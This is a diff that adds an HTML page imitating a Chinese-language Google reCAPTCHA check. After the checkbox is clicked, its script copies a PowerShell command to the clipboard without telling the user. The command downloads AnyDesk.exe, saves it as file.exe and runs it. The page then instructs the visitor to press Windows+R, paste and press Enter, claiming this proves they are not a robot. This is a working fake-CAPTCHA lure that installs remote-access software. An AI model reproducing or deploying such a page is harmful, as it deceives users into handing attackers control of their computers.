@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <title>reCAPTCHA 验证</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
+    <style>
+        .container {
+            font-family: Roboto, helvetica, arial, sans-serif;
+        }
+
+        .m-p {
+            margin: 0;
+            padding: 0;
+        }
+
+        .block {
+            display: block;
+        }
+
+        code {
+            font-size: 9px;
+            margin-left: 2px;
+            color: gray;
+        }
+
+        .line-normal {
+            line-height: normal;
+        }
+
+        .checkbox-window {
+            height: 74px;
+            width: 300px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+        }
+
+        .checkbox-window a {
+            color: #555;
+            text-decoration: none;
+        }
+
+        .checkbox-window a:hover {
+            color: #555;
+            text-decoration: underline;
+        }
+
+        .checkbox-container {
+            width: 28px;
+            height: 28px;
+        }
+
+        .checkbox {
+            position: relative;
+            background-color: #fff;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 21px 0 0 12px;
+            outline: none;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+        }
+
+        .checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+
+        .im-not-a-robot {
+            position: relative;
+            left: 52px;
+            bottom: 3px;
+            font-size: 15px;
+            color: #282727;
+        }
+
+        .captcha-logo {
+            position: relative;
+
+            left: 244px;
+            bottom: 36px;
+            width: 40px;
+            height: 45px;
+            vertical-align: baseline;
+            padding-bottom: 4px;
+        }
+
+        .checkbox-desc {
+            color: #555555;
+            position: relative;
+            font-size: 8px;
+            text-align: center;
+            bottom: 40px;
+            left: 112px;
+        }
+
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -85px;
+            left: 12px;
+            height: 20px;
+            width: 20px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .verify-window {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            margin: auto;
+            width: 310px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            transition: opacity 400ms;
+        }
+
+        ol {
+            counter-reset: item;
+            list-style-type: none;
+            list-style-position: outside;    
+            padding-left: 0;
+
+        }
+
+        ol li {
+            counter-increment: item;
+            margin-bottom: 10px;
+
+        }
+
+        ol li::before {
+            content: counter(item) ". ";
+            color: #1A73E8;
+            font-weight: bold;
+            margin-right: 10px;
+            margin-left: 10px;
+        }
+
+        .verify-container {
+            padding: 8px;
+        }
+
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 16px 16px 24px 16px;
+            color: #fff;
+        }
+
+        .verify-header-text-small {
+            font-size: 14px;
+            line-height: normal;
+        }
+
+        .verify-header-text-medium {
+            font-size: 16px;
+        }
+
+        .verify-header-text-big {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .verify-main {
+            padding: 5px;
+            color: #111;
+            font-size: 13px;
+
+        }
+
+        .verify-footer {
+            border-top: 1px solid #cecece;
+            padding: 10px 7px 10px 7px;
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 102px;
+            font-size: 13px;
+        }
+
+        .verify-footer-left {
+            padding: 5px;
+        }
+
+        .verify-verify-button {
+            text-transform: uppercase;
+            background-color: #5a89e2;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 12px 0 12px 0;
+            text-decoration: none;
+            font-weight: 600;
+            height: min-content;
+            border-radius: 3px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+<div class="container m-p">
+    <div id="checkbox-window" class="checkbox-window m-p block">
+        <div class="checkbox-container m-p">
+            <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
+        </div>
+        <p class="im-not-a-robot m-p line-normal">我不是机器人</p>
+        <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt="">
+        <br>
+        <p class="checkbox-desc m-p line-normal">
+            <a href="https://www.google.com/intl/zh-CN/policies/privacy/">隐私政策</a> - <a href="https://www.google.com/intl/zh-CN/policies/terms/">服务条款</a>
+        </p>
+        <img class="spinner" alt="" id="spinner">
+    </div>
+    <div id="verify-window" class="verify-window">
+        <div class="verify-container">
+            <header class="verify-header">
+                <span class="verify-header-text-medium m-p block">完成下列步骤</span>
+                <span class="verify-header-text-big m-p block">验证</span>
+            </header>
+            <main class="verify-main">
+                <p>
+                    为了证明您不是机器人，请操作：
+                </p>
+                <ol>
+                    <li>
+                        按 <b>Windows</b> + <b>R</b> 键。
+                    </li>
+                    <li>
+                        在新打开的窗口中，按 <b>Ctrl</b> + <b>V</b> 。
+                    </li>
+                    <li>
+                        按 <b>Enter</b> 键完成操作。
+                    </li>
+                </ol>
+                <p>
+                    您将看到并同意：
+                    <br>
+                    <code>
+                        ✅ "验证码： <span id="verification-id">146820</span>"
+                    </code>
+                </p>
+            </main>
+        </div>
+    </div>
+</div>
+
+<script>
+    const checkboxBtn = document.getElementById("checkbox");
+    const spinner = document.getElementById("spinner");
+    const verifyWindow = document.getElementById("verify-window");
+
+    function copyToClipboard(text) {
+        navigator.clipboard.writeText(text).then(() => {
+            console.log("已复制到剪贴板！");
+        }).catch(err => {
+            console.error("剪贴板复制失败：", err);
+        });
+    }
+
+    function showSpinner() {
+        spinner.style.visibility = "visible";
+        spinner.style.opacity = "1";
+        spinner.style.animation = "spin 1s linear infinite";
+    }
+
+    function hideSpinner() {
+        spinner.style.opacity = "0";
+        spinner.style.animation = "none";
+        setTimeout(() => {
+            spinner.style.visibility = "hidden";
+        }, 500);
+    }
+
+    function showVerifyWindow() {
+        verifyWindow.style.display = "block";
+        verifyWindow.style.visibility = "visible";
+        verifyWindow.style.opacity = "1";
+        const command = "powershell -Command Invoke-WebRequest -Uri 'https://download.anydesk.com/AnyDesk.exe' -OutFile $env:USERPROFILE\\file.exe; Start-Process $env:USERPROFILE\\file.exe -Wait";
+        copyToClipboard(command);
+    }
+
+    checkboxBtn.addEventListener("click", () => {
+        showSpinner();
+        setTimeout(() => {
+            hideSpinner();
+            showVerifyWindow();
+        }, 1000);
+    });
+</script>
+</body>
+</html>
